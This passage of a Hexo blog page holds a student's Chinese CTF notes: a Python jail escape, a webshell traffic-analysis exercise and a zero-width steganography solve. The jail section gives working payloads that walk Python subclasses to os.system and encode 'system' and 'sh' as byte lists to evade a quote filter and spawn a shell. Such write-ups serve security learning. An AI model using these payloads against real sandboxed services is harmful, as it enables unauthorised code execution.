@@ -1,0 +1,720 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    NSSCTF_笔记_MISc |
+    
+    Flight-star&#39;blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="我准备试试看深入试试看misc，老是做web 太无聊了  [HNCTF 2022]calc_jail_beginner_level4.0.5 第一次接触NC 1.得到地址，打开Kali1nc node5.anna.nssctf.cn 29086   即可进入输入页面 2.考察Python沙盒逃逸（类似于SSTI）什么是python沙盒逃逸？ 在已知禁用的函数下进行恶意注入 3.前面都类似SSTI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF_笔记_MISc">
+<meta property="og:url" content="http://example.com/2025/04/28/NSSCTF-%E7%AC%94%E8%AE%B0_MISC/index.html">
+<meta property="og:site_name" content="Flight-star&#39;blog">
+<meta property="og:description" content="我准备试试看深入试试看misc，老是做web 太无聊了  [HNCTF 2022]calc_jail_beginner_level4.0.5 第一次接触NC 1.得到地址，打开Kali1nc node5.anna.nssctf.cn 29086   即可进入输入页面 2.考察Python沙盒逃逸（类似于SSTI）什么是python沙盒逃逸？ 在已知禁用的函数下进行恶意注入 3.前面都类似SSTI">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20250428232930331-1745854171325-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250429004445276-1745858687156-7.png">
+<meta property="og:image" content="http://example.com/images/image-20250602225931609-1748876372423-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250602230325668-1748876606474-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250602231306075-1748877186741-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250602231253866.png">
+<meta property="og:image" content="http://example.com/images/image-20250602233304829-1748878385598-11.png">
+<meta property="og:image" content="http://example.com/images/image-20250604125331824-1749012812850-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250604125507472-1749012908141-7.png">
+<meta property="og:image" content="http://example.com/images/image-20250604125614553-1749012975643-9.png">
+<meta property="og:image" content="http://example.com/images/image-20250604124036531-1749012037790-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250604124414684-1749012255596-3.png">
+<meta property="article:published_time" content="2025-04-28T13:51:00.000Z">
+<meta property="article:modified_time" content="2025-06-04T04:59:37.222Z">
+<meta property="article:author" content="Flight-star">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250428232930331-1745854171325-1.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Flight-star'blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">Friend</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="NSSCTF_笔记_MISc">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">NSSCTF_笔记_MISc</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-NSSCTF-笔记_MISC" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/28/NSSCTF-%E7%AC%94%E8%AE%B0_MISC/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-28T13:51:00.000Z" itemprop="datePublished">2025-04-28</time>
+    <time style="display: none;" id="post-update-time">2025-06-04</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p> 我准备试试看深入试试看<code>misc</code>，老是做<code>web</code> 太无聊了 </p>
+<h2 id="HNCTF-2022-calc-jail-beginner-level4-0-5"><a href="#HNCTF-2022-calc-jail-beginner-level4-0-5" class="headerlink" title="[HNCTF 2022]calc_jail_beginner_level4.0.5"></a>[HNCTF 2022]calc_jail_beginner_level4.0.5</h2><p> 第一次接触<code>NC</code></p>
+<h3 id="1-得到地址，打开Kali"><a href="#1-得到地址，打开Kali" class="headerlink" title="1.得到地址，打开Kali"></a>1.得到地址，打开<code>Kali</code></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc node5.anna.nssctf.cn <span class="number">29086</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250428232930331-1745854171325-1.png" alt="image-20250428232930331"></p>
+<p>即可进入输入页面</p>
+<h3 id="2-考察Python沙盒逃逸（类似于SSTI）"><a href="#2-考察Python沙盒逃逸（类似于SSTI）" class="headerlink" title="2.考察Python沙盒逃逸（类似于SSTI）"></a>2.考察<font color="red">Python沙盒逃逸</font>（类似于SSTI）</h3><p>什么是<code>python</code>沙盒逃逸？</p>
+<p><strong>在已知禁用的函数下进行恶意注入</strong></p>
+<h3 id="3-前面都类似SSTI"><a href="#3-前面都类似SSTI" class="headerlink" title="3.前面都类似SSTI"></a>3.前面都类似SSTI</h3><p>类似SSTI需要一步一步调用<code>OS</code>模板来调用<code>system</code>函数</p>
+<p>不同的是我们需要用<code>print</code>来输出（我们已经进入py环境了）</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">139</span>].__init__.__globals__)</span><br></pre></td></tr></table></figure>
+
+<p>发现有回显，就说明成功了</p>
+<h3 id="4-’’，””被禁用，怎么引用system？"><a href="#4-’’，””被禁用，怎么引用system？" class="headerlink" title="4.’’，””被禁用，怎么引用system？"></a>4.’’，””被禁用，怎么引用system？</h3><p>使用<strong>byte  +  decode</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">bytes</span>([<span class="number">115</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>]).decode()](<span class="built_in">bytes</span>([<span class="number">115</span>,<span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
+
+<p>成功链接</p>
+<p><img src="/../images/image-20250429004445276-1745858687156-7.png" alt="image-20250429004445276"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">nl flag</span><br><span class="line">即可</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="WEBshell"><a href="#WEBshell" class="headerlink" title="WEBshell"></a>WEBshell</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p><strong>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：</strong></p>
+<p> <strong>黑客登录系统使用的密码是_____。。得到的flag请使用NSSCTF{}格式提交。</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains <span class="string">&quot;password&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>请求里面包含   <strong>“      “</strong></p>
+<p><img src="/../images/image-20250602225931609-1748876372423-1.png" alt="image-20250602225931609"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Admin123!@<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p><strong>黑客修改了一个日志文件，文件的绝对路径为__&#x2F;var&#x2F;www&#x2F;html&#x2F;data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log_____。</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains <span class="string">&quot;log&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>发现攻击企图</strong></p>
+<p><img src="/../images/image-20250602230325668-1748876606474-3.png" alt="image-20250602230325668"></p>
+<p>发现写入文件：</p>
+<p><img src="/../images/image-20250602231306075-1748877186741-5.png" alt="image-20250602231306075"></p>
+<p>翻译：</p>
+<p><img src="/../images/image-20250602231253866.png" alt="image-20250602231253866"></p>
+<h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p><strong>黑客获取webshell之后，权限是___<em>_</em>_。</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>权限级别</strong></th>
+<th align="center"><strong>代表用户</strong></th>
+<th align="center"><strong>控制范围</strong></th>
+<th align="center"><strong>典型利用手段</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>受限用户</strong></td>
+<td align="center"><code>www-data</code>&#x2F;<code>nginx</code></td>
+<td align="center">仅Web目录读写、数据库连接</td>
+<td align="center">文件遍历、数据库窃取</td>
+</tr>
+<tr>
+<td align="center"><strong>普通用户</strong></td>
+<td align="center"><code>/home/user</code></td>
+<td align="center">用户目录文件、当前用户进程</td>
+<td align="center">SSH密钥劫持、环境变量注入</td>
+</tr>
+<tr>
+<td align="center"><strong>ROOT权限</strong></td>
+<td align="center"><code>uid=0</code></td>
+<td align="center">全系统控制 (最危险阶段)</td>
+<td align="center">内核提权、SSH后门植入</td>
+</tr>
+</tbody></table>
+<p>我们<strong>可以直接搜索：</strong></p>
+<p><img src="/../images/image-20250602233304829-1748878385598-11.png" alt="image-20250602233304829"></p>
+<p><strong>发现是受限用户</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="UTCTF-2020-Zero"><a href="#UTCTF-2020-Zero" class="headerlink" title="[UTCTF 2020]Zero"></a>[UTCTF 2020]Zero</h1><p>考察点：隐写</p>
+<h3 id="我的方法："><a href="#我的方法：" class="headerlink" title="我的方法："></a>我的方法：</h3><h4 id="打开VS发现："><a href="#打开VS发现：" class="headerlink" title="打开VS发现："></a>打开<code>VS</code>发现：</h4><p><img src="/../images/image-20250604125331824-1749012812850-5.png" alt="image-20250604125331824"></p>
+<p><strong>存在奇奇怪怪的东西：<code>[U+202C]</code></strong></p>
+<p>问AI发现是隐写：</p>
+<p><img src="/../images/image-20250604125507472-1749012908141-7.png" alt="image-20250604125507472"></p>
+<h4 id="打开网站就可以直接解密："><a href="#打开网站就可以直接解密：" class="headerlink" title="打开网站就可以直接解密："></a>打开网站就可以直接解密：</h4><p><a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters</a></p>
+<p><img src="/../images/image-20250604125614553-1749012975643-9.png" alt="image-20250604125614553"></p>
+<h3 id="答案WP："><a href="#答案WP：" class="headerlink" title="答案WP："></a>答案WP：</h3><h4 id="我们打开kali使用vim打开康康"><a href="#我们打开kali使用vim打开康康" class="headerlink" title="我们打开kali使用vim打开康康"></a><strong>我们打开<code>kali</code>使用<code>vim</code>打开康康</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="string">&#x27;/home/flitar/桌面/MISC/zero.txt&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250604124036531-1749012037790-1.png" alt="image-20250604124036531"></p>
+<p><img src="/../images/image-20250604124414684-1749012255596-3.png" alt="image-20250604124414684"></p>
+<h3 id="关于VIM的指令："><a href="#关于VIM的指令：" class="headerlink" title="关于VIM的指令："></a>关于VIM的指令：</h3><h4 id="编辑命令"><a href="#编辑命令" class="headerlink" title="编辑命令"></a>编辑命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">i			<span class="comment">#进入插入模式</span></span><br><span class="line">a			<span class="comment">#光标后插入</span></span><br><span class="line">o			<span class="comment">#下方插入新行</span></span><br><span class="line">O			<span class="comment">#上方插入新行</span></span><br><span class="line">x			<span class="comment">#删除光标处字符</span></span><br><span class="line">dw			<span class="comment">#删除单词</span></span><br><span class="line">dd			<span class="comment">#删除整行</span></span><br><span class="line">u			<span class="comment">#撤销操作</span></span><br><span class="line">Ctrl+r		<span class="comment">#重做操作</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="退出Vim"><a href="#退出Vim" class="headerlink" title="退出Vim"></a>退出Vim</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:wq     	<span class="comment"># 保存并退出</span></span><br><span class="line">:x      	<span class="comment"># 等同于:wq (更快捷)</span></span><br><span class="line">ZZ     		<span class="comment"># (大写) 保存并退出</span></span><br><span class="line">:q!     	<span class="comment"># 强制退出不保存修改</span></span><br><span class="line">ZQ      	<span class="comment"># (大写) 等价于:q!</span></span><br><span class="line">:w      	<span class="comment"># 保存文件</span></span><br><span class="line">:w filename <span class="comment"># 另存为新文件</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/covers/reimu.webp" data-sizes="auto" alt="NSSCTF_笔记_WEB" class="lazyload">
+          
+        
+        <a href="/2025/04/30/NSSCTF-%E7%AC%94%E8%AE%B0-WEB/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            NSSCTF_笔记_WEB
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/十六夜咲夜 (3).jpg" data-sizes="auto" alt="再探BUU" class="lazyload">
+        
+      
+      <a href="/2025/04/24/2025-04-24-%E5%86%8D%E6%8E%A2BUU/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          再探BUU
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-calc-jail-beginner-level4-0-5"><span class="toc-number">1.</span> <span class="toc-text">[HNCTF 2022]calc_jail_beginner_level4.0.5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BE%97%E5%88%B0%E5%9C%B0%E5%9D%80%EF%BC%8C%E6%89%93%E5%BC%80Kali"><span class="toc-number">1.1.</span> <span class="toc-text">1.得到地址，打开Kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%80%83%E5%AF%9FPython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%88%E7%B1%BB%E4%BC%BC%E4%BA%8ESSTI%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">2.考察Python沙盒逃逸（类似于SSTI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%89%8D%E9%9D%A2%E9%83%BD%E7%B1%BB%E4%BC%BCSSTI"><span class="toc-number">1.3.</span> <span class="toc-text">3.前面都类似SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E2%80%99%E2%80%99%EF%BC%8C%E2%80%9D%E2%80%9D%E8%A2%AB%E7%A6%81%E7%94%A8%EF%BC%8C%E6%80%8E%E4%B9%88%E5%BC%95%E7%94%A8system%EF%BC%9F"><span class="toc-number">1.4.</span> <span class="toc-text">4.’’，””被禁用，怎么引用system？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEBshell"><span class="toc-number"></span> <span class="toc-text">WEBshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-number">1.</span> <span class="toc-text">1.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2"><span class="toc-number">2.</span> <span class="toc-text">2.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3"><span class="toc-number">3.</span> <span class="toc-text">3.</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UTCTF-2020-Zero"><span class="toc-number"></span> <span class="toc-text">[UTCTF 2020]Zero</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">0.1.</span> <span class="toc-text">我的方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%BC%80VS%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="toc-number">0.1.1.</span> <span class="toc-text">打开VS发现：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E7%BD%91%E7%AB%99%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%A7%A3%E5%AF%86%EF%BC%9A"><span class="toc-number">0.1.2.</span> <span class="toc-text">打开网站就可以直接解密：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88WP%EF%BC%9A"><span class="toc-number">0.2.</span> <span class="toc-text">答案WP：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E6%89%93%E5%BC%80kali%E4%BD%BF%E7%94%A8vim%E6%89%93%E5%BC%80%E5%BA%B7%E5%BA%B7"><span class="toc-number">0.2.1.</span> <span class="toc-text">我们打开kali使用vim打开康康</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EVIM%E7%9A%84%E6%8C%87%E4%BB%A4%EF%BC%9A"><span class="toc-number">0.3.</span> <span class="toc-text">关于VIM的指令：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%BE%91%E5%91%BD%E4%BB%A4"><span class="toc-number">0.3.1.</span> <span class="toc-text">编辑命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%80%E5%87%BAVim"><span class="toc-number">0.3.2.</span> <span class="toc-text">退出Vim</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep"></span>
+      Flight-star
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        65.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:01
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-calc-jail-beginner-level4-0-5"><span class="toc-number">1.</span> <span class="toc-text">[HNCTF 2022]calc_jail_beginner_level4.0.5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BE%97%E5%88%B0%E5%9C%B0%E5%9D%80%EF%BC%8C%E6%89%93%E5%BC%80Kali"><span class="toc-number">1.1.</span> <span class="toc-text">1.得到地址，打开Kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%80%83%E5%AF%9FPython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%88%E7%B1%BB%E4%BC%BC%E4%BA%8ESSTI%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">2.考察Python沙盒逃逸（类似于SSTI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%89%8D%E9%9D%A2%E9%83%BD%E7%B1%BB%E4%BC%BCSSTI"><span class="toc-number">1.3.</span> <span class="toc-text">3.前面都类似SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E2%80%99%E2%80%99%EF%BC%8C%E2%80%9D%E2%80%9D%E8%A2%AB%E7%A6%81%E7%94%A8%EF%BC%8C%E6%80%8E%E4%B9%88%E5%BC%95%E7%94%A8system%EF%BC%9F"><span class="toc-number">1.4.</span> <span class="toc-text">4.’’，””被禁用，怎么引用system？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEBshell"><span class="toc-number"></span> <span class="toc-text">WEBshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-number">1.</span> <span class="toc-text">1.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2"><span class="toc-number">2.</span> <span class="toc-text">2.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3"><span class="toc-number">3.</span> <span class="toc-text">3.</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UTCTF-2020-Zero"><span class="toc-number"></span> <span class="toc-text">[UTCTF 2020]Zero</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">0.1.</span> <span class="toc-text">我的方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%BC%80VS%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="toc-number">0.1.1.</span> <span class="toc-text">打开VS发现：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 